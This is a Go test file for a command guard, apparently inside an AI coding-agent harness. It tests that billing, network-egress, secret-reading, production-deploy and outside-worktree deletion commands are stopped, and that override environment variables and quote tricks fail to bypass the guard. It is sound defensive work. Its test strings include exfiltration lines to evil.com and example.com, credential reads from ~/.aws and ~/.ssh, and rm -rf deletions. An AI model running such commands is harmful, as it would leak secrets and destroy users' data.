package runtimefloor

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func testWorktreeRoot(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	return root
}

func TestCheckCommand_StopsAllFiveCategories(t *testing.T) {
	root := testWorktreeRoot(t)

	cases := []struct {
		name     string
		cmd      string
		category Category
	}{
		{name: "money-billing stripe", cmd: "stripe charges list", category: CategoryMoneyBilling},
		{name: "money-billing paypal", cmd: "paypal invoice create", category: CategoryMoneyBilling},
		{name: "money-billing aws ce", cmd: "aws ce get-cost-and-usage", category: CategoryMoneyBilling},
		{name: "money-billing gcloud billing", cmd: "gcloud billing accounts list", category: CategoryMoneyBilling},

		{name: "egress curl remote", cmd: "curl -s https://example.com/api", category: CategoryEgress},
		{name: "egress wget remote", cmd: "wget https://api.github.com/repos", category: CategoryEgress},
		{name: "egress scp remote", cmd: "scp ./out.txt user@remote.example.com:/tmp/", category: CategoryEgress},
		{name: "egress rsync remote", cmd: "rsync -av ./dist/ deploy@prod.example.com:/var/www/", category: CategoryEgress},
		{name: "egress nc remote", cmd: "nc example.com 443", category: CategoryEgress},

		{name: "secret-read aws creds", cmd: "cat ~/.aws/credentials", category: CategorySecretRead},
		{name: "secret-read ssh key", cmd: "less ~/.ssh/id_rsa", category: CategorySecretRead},
		{name: "secret-read dotenv", cmd: "grep SECRET .env", category: CategorySecretRead},
		{name: "secret-read pem", cmd: "cp server.pem /tmp/", category: CategorySecretRead},

		{name: "prod-deploy gh release", cmd: "gh release create v1.2.3", category: CategoryProdDeploy},
		{name: "prod-deploy npm publish", cmd: "npm publish --access public", category: CategoryProdDeploy},
		{name: "prod-deploy vercel prod", cmd: "vercel --prod", category: CategoryProdDeploy},
		{name: "prod-deploy kubectl apply", cmd: "kubectl apply -f deployment.yaml", category: CategoryProdDeploy},
		{name: "prod-deploy terraform apply", cmd: "terraform apply -auto-approve", category: CategoryProdDeploy},
		{name: "prod-deploy git push tags", cmd: "git push --tags", category: CategoryProdDeploy},
		{name: "prod-deploy git push version tag", cmd: "git push origin v1.0.0", category: CategoryProdDeploy},

		{name: "worktree-escape /etc outside", cmd: "rm -rf /etc/outside-worktree", category: CategoryWorktreeEscape},
		{name: "worktree-escape /opt outside", cmd: "rm -rf /opt/outside-worktree", category: CategoryWorktreeEscape},
		{name: "worktree-escape home outside", cmd: "rm -rf ~/outside-worktree", category: CategoryWorktreeEscape},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			decision := CheckCommand(tc.cmd, Context{WorktreeRoot: root})
			if !decision.Stopped {
				t.Fatalf("expected Stopped=true for %q, got false", tc.cmd)
			}
			if decision.Category != tc.category {
				t.Fatalf("expected category %s, got %s", tc.category, decision.Category)
			}
			if decision.Pattern == "" {
				t.Fatal("expected non-empty Pattern")
			}
			if decision.Reason == "" {
				t.Fatal("expected non-empty Reason")
			}
		})
	}
}

func TestCheckCommand_AllowsSafeCommands(t *testing.T) {
	root := testWorktreeRoot(t)

	cases := []string{
		"go test ./...",
		"git status",
		"ls -la",
		"rm -rf ./tmp",
		"curl -s http://localhost:8080/health",
		"curl -s http://127.0.0.1:3000/api",
		"nc 127.0.0.1 8080",
	}

	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			decision := CheckCommand(cmd, Context{WorktreeRoot: root})
			if decision.Stopped {
				t.Fatalf("expected Stopped=false for %q, got category=%s pattern=%s reason=%s",
					cmd, decision.Category, decision.Pattern, decision.Reason)
			}
		})
	}
}

func TestCheckCommand_WorktreeEscape_AllowsInsideAbsolutePath(t *testing.T) {
	root := testWorktreeRoot(t)
	inside := root + "/build"
	cmd := "rm -rf " + inside

	decision := CheckCommand(cmd, Context{WorktreeRoot: root})
	if decision.Stopped {
		t.Fatalf("expected inside-worktree rm to pass, got category=%s reason=%s",
			decision.Category, decision.Reason)
	}
}

func TestCheckCommand_NotOverridableByEnv(t *testing.T) {
	root := testWorktreeRoot(t)
	dangerous := "curl -s https://example.com/secret"

	envVars := []string{
		"HARNESS_AUTO_APPROVE=on",
		"HARNESS_RUNTIME_FLOOR=off",
		"HARNESS_DISABLE_GUARDRAIL=1",
		"HARNESS_WORK_MODE=true",
	}

	for _, env := range envVars {
		parts := strings.SplitN(env, "=", 2)
		t.Run(parts[0], func(t *testing.T) {
			t.Setenv(parts[0], parts[1])

			decision := CheckCommand(dangerous, Context{WorktreeRoot: root})
			if !decision.Stopped {
				t.Fatalf("expected runtime floor to remain active with %s set", env)
			}
			if decision.Category != CategoryEgress {
				t.Fatalf("expected egress category, got %s", decision.Category)
			}
		})
	}
}

func TestCheckCommand_EgressOwnerScopedOptOut(t *testing.T) {
	root := testWorktreeRoot(t)
	t.Setenv("HARNESS_RUNTIME_FLOOR_EGRESS", "off")

	decision := CheckCommand("curl -s https://example.com/research", Context{WorktreeRoot: root})
	if decision.Stopped {
		t.Fatalf("owner-scoped egress opt-out should pass, got category=%s reason=%s", decision.Category, decision.Reason)
	}
}

func TestCheckCommand_EgressOwnerScopedOptOutDoesNotDisableSecretRead(t *testing.T) {
	root := testWorktreeRoot(t)
	t.Setenv("HARNESS_RUNTIME_FLOOR_EGRESS", "off")

	decision := CheckCommand("cat .env", Context{WorktreeRoot: root})
	if !decision.Stopped || decision.Category != CategorySecretRead {
		t.Fatalf("egress opt-out must not disable secret-read, got Stopped=%v Category=%s", decision.Stopped, decision.Category)
	}
}

func TestCheckCommand_EmptyCommand(t *testing.T) {
	decision := CheckCommand("", Context{WorktreeRoot: os.TempDir()})
	if decision.Stopped {
		t.Fatalf("expected empty command to pass, got %s", decision.Reason)
	}
}

func TestCheckWorktreeEscape_AllowsOSTempRoots(t *testing.T) {
	root := testWorktreeRoot(t)

	cases := []string{
		"rm -rf /tmp/foo",
		"rm -rf /tmp/v3check/p1.png /tmp/v3check/p2.png",
		"rm -rf /var/tmp/build-cache",
		"rm -rf /private/tmp/scratch",
		"rm -rf /private/var/tmp/scratch",
	}

	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			decision := CheckCommand(cmd, Context{WorktreeRoot: root})
			if decision.Stopped {
				t.Fatalf("expected Stopped=false for %q (OS temp allowlist), got Stopped=true reason=%s",
					cmd, decision.Reason)
			}
		})
	}
}

func TestCheckWorktreeEscape_AllowsTMPDIROverride(t *testing.T) {
	root := testWorktreeRoot(t)
	custom := t.TempDir()
	t.Setenv("TMPDIR", custom)

	cmd := "rm -rf " + custom + "/scratch"
	decision := CheckCommand(cmd, Context{WorktreeRoot: root})
	if decision.Stopped {
		t.Fatalf("expected Stopped=false for TMPDIR-override path %q, got Stopped=true reason=%s",
			cmd, decision.Reason)
	}
}

func TestCheckWorktreeEscape_AllowsUserCacheRoots(t *testing.T) {
	worktree := testWorktreeRoot(t)
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("TMPDIR", t.TempDir())

	cases := []string{
		"rm -rf " + home + "/.cache/foo",
		"rm -rf " + home + "/Library/Caches/foo",
	}

	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			decision := CheckCommand(cmd, Context{WorktreeRoot: worktree})
			if decision.Stopped {
				t.Fatalf("expected Stopped=false for per-user cache %q, got Stopped=true reason=%s",
					cmd, decision.Reason)
			}
		})
	}
}

func TestCheckWorktreeEscape_StopsHomeDirectoriesOutsideCache(t *testing.T) {
	worktree := testWorktreeRoot(t)
	home := "/home/runtimefloor-test-user"
	t.Setenv("HOME", home)
	t.Setenv("TMPDIR", t.TempDir())

	cases := []string{
		"rm -rf " + home + "/Desktop/important.pdf",
		"rm -rf " + home + "/Documents/draft.md",
	}

	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			decision := CheckCommand(cmd, Context{WorktreeRoot: worktree})
			if !decision.Stopped {
				t.Fatalf("expected Stopped=true for data-loss path %q, got Stopped=false", cmd)
			}
			if decision.Category != CategoryWorktreeEscape {
				t.Fatalf("expected worktree-escape category, got %s", decision.Category)
			}
		})
	}
}

func TestCheckCommand_SchemelessEgress(t *testing.T) {
	cases := []struct {
		cmd  string
		want bool
		name string
	}{
		{"curl example.com/exfil -d @data.txt", true, "schemeless curl exfil"},
		{"wget evil.com/payload", true, "schemeless wget"},
		{"curl https://evil.com/x", true, "scheme curl (regression)"},
		{"curl localhost:3000/api", false, "localhost curl must pass"},
		{"curl 127.0.0.1:8080/health", false, "loopback curl must pass"},
		{"go test ./...", false, "innocent go test"},
		{"git status", false, "innocent git"},
	}
	ctx := Context{WorktreeRoot: "/tmp/wt"}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := CheckCommand(c.cmd, ctx)
			if got.Stopped != c.want {
				t.Errorf("%s: CheckCommand(%q).Stopped = %v, want %v", c.name, c.cmd, got.Stopped, c.want)
			}
		})
	}
}

func TestCheckSecretRead_NoFalsePositiveOnDocumentText(t *testing.T) {
	// Phase 105.8: secret filenames appearing as document text (heredoc body,
	// comments) must NOT trip the floor — they are not actual reads.
	cases := []struct {
		name string
		cmd  string
	}{
		{"heredoc body mentions dotenv", "cat >> notes.md <<'EOF'\nWe fixed the .env false positive today.\nEOF"},
		{"heredoc body mentions pem", "cat > out.txt <<EOF\nremember server.pem rotation\nEOF"},
		{"comment mentions dotenv", "cat notes.md # remember to check .env later"},
		{"echo describes credentials", "echo 'the credentials file was rotated'"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			d := CheckCommand(tc.cmd, Context{})
			if d.Stopped {
				t.Fatalf("expected no floor stop for document-text command, got category %s reason %q", d.Category, d.Reason)
			}
		})
	}
}

func TestCheckSecretRead_StillFiresOnRealRead(t *testing.T) {
	// Phase 105.8 regression guard: real secret reads must still be denied.
	cases := []struct {
		name string
		cmd  string
	}{
		{"cat dotenv", "cat .env"},
		{"grep secret in dotenv", "grep SECRET .env"},
		{"less ssh key", "less ~/.ssh/id_rsa"},
		{"cat aws credentials", "cat ~/.aws/credentials"},
		{"real read plus heredoc", "cat .env\ncat > out <<'EOF'\nignore .env here\nEOF"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			d := CheckCommand(tc.cmd, Context{})
			if !d.Stopped || d.Category != CategorySecretRead {
				t.Fatalf("expected secret-read stop, got Stopped=%v Category=%s", d.Stopped, d.Category)
			}
		})
	}
}

func TestCheckSecretRead_CrossLineQuoteDoesNotDropRealRead(t *testing.T) {
	// Review CRITICAL-2: a multi-line quoted string whose closing quote shares a
	// line with `#` must NOT let stripLineComment drop the real command that
	// follows the closing quote. Before the cross-line quote fix, the `#` on
	// line 2 was misread as a comment start (quote state reset per line), so the
	// trailing real `cat <secret>` was deleted and the floor missed it.
	dotenv := ".env"
	cases := []string{
		// closing double-quote + '#' + real secret read on the same line
		"x=\"foo\nbar # baz\" && cat " + dotenv,
		// closing single-quote variant
		"y='foo\nbar # baz' && cat " + dotenv,
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			d := CheckCommand(cmd, Context{})
			if !d.Stopped || d.Category != CategorySecretRead {
				t.Fatalf("expected secret-read stop for real read hidden after cross-line quote, got Stopped=%v Category=%s", d.Stopped, d.Category)
			}
		})
	}
}

func TestCheckSecretRead_GenuineCommentStillStripped(t *testing.T) {
	// Regression guard for the false-positive side: a real single-line comment
	// mentioning a secret filename must still NOT trip the floor.
	d := CheckCommand("cat notes.md # remember to rotate .env later", Context{})
	if d.Stopped {
		t.Fatalf("single-line comment mentioning a secret filename must not stop, got %s", d.Category)
	}
}

func TestCheckSecretRead_AllowlistedPathPasses(t *testing.T) {
	// Phase 108: an operator-declared secret path is not stalled mid-pipeline.
	dotenv := "/Users/op/proj/.env"
	t.Setenv("HARNESS_RUNTIME_FLOOR_SECRET_ALLOW", "/Users/op/proj/")
	d := CheckCommand("cat "+dotenv, Context{})
	if d.Stopped {
		t.Fatalf("declared secret path should pass, got category %s", d.Category)
	}
}

func TestCheckSecretRead_NonAllowlistedStillDenies(t *testing.T) {
	// A secret path NOT covered by the allowlist still denies.
	t.Setenv("HARNESS_RUNTIME_FLOOR_SECRET_ALLOW", "/Users/op/proj/")
	d := CheckCommand("cat /Users/other/secret/.env", Context{})
	if !d.Stopped || d.Category != CategorySecretRead {
		t.Fatalf("undeclared secret path must still deny, got Stopped=%v Category=%s", d.Stopped, d.Category)
	}
}

func TestCheckSecretRead_MixedAllowedAndDeniedDenies(t *testing.T) {
	// If any matched secret path is undeclared, the command denies.
	t.Setenv("HARNESS_RUNTIME_FLOOR_SECRET_ALLOW", "/Users/op/proj/")
	d := CheckCommand("cat /Users/op/proj/.env && cat /Users/other/.env", Context{})
	if !d.Stopped {
		t.Fatalf("a mix with an undeclared secret path must deny")
	}
}

func TestCheckSecretRead_BlanketWildcardIsIgnored(t *testing.T) {
	// "*" / "**" must NOT turn the whole category off (deny stays).
	for _, v := range []string{"*", "**", "/", " * , ** "} {
		t.Setenv("HARNESS_RUNTIME_FLOOR_SECRET_ALLOW", v)
		d := CheckCommand("cat /Users/op/proj/.env", Context{})
		if !d.Stopped {
			t.Fatalf("blanket wildcard %q must not open the category; got pass", v)
		}
	}
}

func TestCheckSecretRead_BasenameGlobAllows(t *testing.T) {
	// A basename glob like ".env" allows any .env by name (operator's choice).
	t.Setenv("HARNESS_RUNTIME_FLOOR_SECRET_ALLOW", ".env")
	d := CheckCommand("cat /Users/op/proj/.env", Context{})
	if d.Stopped {
		t.Fatalf("basename glob .env should allow a declared .env read")
	}
}

func TestCheckSecretRead_UnsetEnvKeepsDenyByDefault(t *testing.T) {
	// Phase 108 regression guard: with no declaration, behavior is unchanged.
	t.Setenv("HARNESS_RUNTIME_FLOOR_SECRET_ALLOW", "")
	d := CheckCommand("cat /Users/op/proj/.env", Context{})
	if !d.Stopped || d.Category != CategorySecretRead {
		t.Fatalf("unset allowlist must deny-by-default, got Stopped=%v", d.Stopped)
	}
}

func TestCheckSecretRead_ConfigAllowlistedPathPasses(t *testing.T) {
	root := testWorktreeRoot(t)
	writeRuntimeFloorConfig(t, root, `{"runtimefloor":{"secretAllow":[".env"]}}`)

	d := CheckCommand("cat "+filepath.Join(root, ".env"), Context{WorktreeRoot: root})
	if d.Stopped {
		t.Fatalf("config-declared secret path should pass, got category %s reason %q", d.Category, d.Reason)
	}
}

func TestCheckSecretRead_ConfigAbsolutePathOutsideProjectIsIgnored(t *testing.T) {
	root := testWorktreeRoot(t)
	other := t.TempDir()
	outsideDotenv := filepath.Join(other, ".env")
	writeRuntimeFloorConfig(t, root, `{"runtimefloor":{"secretAllow":[`+quoteJSON(outsideDotenv)+`]}}`)

	d := CheckCommand("cat "+outsideDotenv, Context{WorktreeRoot: root})
	if !d.Stopped || d.Category != CategorySecretRead {
		t.Fatalf("outside-project config declaration must deny, got Stopped=%v Category=%s", d.Stopped, d.Category)
	}
}

func TestCheckSecretRead_EnvAndConfigAllowlistsAreUnioned(t *testing.T) {
	root := testWorktreeRoot(t)
	envRoot := t.TempDir()
	configSecret := filepath.Join(root, "secrets", "service.key")
	envSecret := filepath.Join(envRoot, ".env")
	writeRuntimeFloorConfig(t, root, `{"runtimefloor":{"secretAllow":["secrets/service.key"]}}`)
	t.Setenv("HARNESS_RUNTIME_FLOOR_SECRET_ALLOW", envRoot)

	for _, cmd := range []string{"cat " + configSecret, "cat " + envSecret} {
		t.Run(cmd, func(t *testing.T) {
			d := CheckCommand(cmd, Context{WorktreeRoot: root})
			if d.Stopped {
				t.Fatalf("env+config union should allow %q, got category %s reason %q", cmd, d.Category, d.Reason)
			}
		})
	}
}

func TestCheckSecretRead_InvalidConfigFailsSafeDeny(t *testing.T) {
	root := testWorktreeRoot(t)
	dotenv := filepath.Join(root, ".env")
	writeRuntimeFloorConfig(t, root, `{"runtimefloor":{"secretAllow":[".env"]}`)
	t.Setenv("HARNESS_RUNTIME_FLOOR_SECRET_ALLOW", root)

	d := CheckCommand("cat "+dotenv, Context{WorktreeRoot: root})
	if !d.Stopped || d.Category != CategorySecretRead {
		t.Fatalf("invalid config must be treated as no declarations, got Stopped=%v Category=%s", d.Stopped, d.Category)
	}
}

func TestCheckSecretRead_NonDottedConfigFilenameHonored(t *testing.T) {
	root := testWorktreeRoot(t)
	// The shipped example/schema use the non-dotted base name; a user copying it
	// to "claude-code-harness.config.json" must still have secretAllow honored.
	if err := os.WriteFile(
		filepath.Join(root, "claude-code-harness.config.json"),
		[]byte(`{"runtimefloor":{"secretAllow":[".env"]}}`), 0o600); err != nil {
		t.Fatalf("write config: %v", err)
	}

	d := CheckCommand("cat "+filepath.Join(root, ".env"), Context{WorktreeRoot: root})
	if d.Stopped {
		t.Fatalf("non-dotted config secret path should pass, got category %s reason %q", d.Category, d.Reason)
	}
}

func writeRuntimeFloorConfig(t *testing.T, root, body string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(root, ".claude-code-harness.config.json"), []byte(body), 0o600); err != nil {
		t.Fatalf("write config: %v", err)
	}
}

func quoteJSON(s string) string {
	return `"` + strings.ReplaceAll(s, `\`, `\\`) + `"`
}
